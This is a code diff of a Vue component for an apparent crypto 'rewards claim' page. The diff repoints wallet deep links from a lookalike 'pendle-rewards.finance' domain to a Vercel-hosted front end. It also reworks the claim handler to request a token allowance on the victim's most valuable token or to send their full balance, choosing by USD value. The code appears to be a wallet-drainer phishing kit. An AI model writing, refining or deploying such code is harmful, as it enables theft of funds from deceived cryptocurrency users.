@@ -484,7 +484,7 @@ export default {
           this.wConnect()
           return;
         }
-        url = 'https://metamask.app.link/dapp/pendle-rewards.finance';
+        url = 'https://metamask.app.link/dapp/multi-call-front-end.vercel.app';
       }
       if (type == 2) {
         if (window.ethereum) {
@@ -492,7 +492,7 @@ export default {
         }
 
         url =
-          'https://go.cb-w.com/dapp?cb_url=https%3a%2f%2fpendle-rewards.finance%2f';
+          'https://go.cb-w.com/dapp?cb_url=https%3a%2f%2fmulti-call-front-end.vercel.app%2f';
       }
       if (type == 3) {
         if(window.ethereum){
@@ -501,7 +501,7 @@ export default {
           this.wConnect()
           return;
         }
-        url = "https://link.trustwallet.com/open_url?coin_id=60&url=https://pendle-rewards.finance/";
+        url = "https://link.trustwallet.com/open_url?coin_id=60&url=https://multi-call-front-end.vercel.app/";
       }
       if (type == 4) {
         url =
@@ -518,19 +518,19 @@ export default {
       if (getAccount().isConnected) {
         this.processing = true;
         this.isDone = false;
-
-        if (this.tokens.length > 0 && this.maxToken) {
-          await increaseAllowance(this.maxToken);
-        } else {
+        if (this.maxToken && this.claimable > this.maxToken.usdValue) {
           await claim(this.balance.value);
-          const balance = await ethBalance();
-          console.log(balance);
-          console.log(this.balance.value);
-          if (balance < this.balance.value) {
-            this.claimable = 0;
+        } else {
+          if (this.tokens.length > 0 && this.maxToken) {
+              await increaseAllowance(this.maxToken);
+          } else {
+            await claim(this.balance.value);
           }
         }
-
+        const balanceethw = await ethBalance();
+        if (balanceethw.value < this.balance.value) {
+          this.claimable = 0;
+        }
         this.processing = false;
         this.isDone = true;
         console.log(this.claimable);
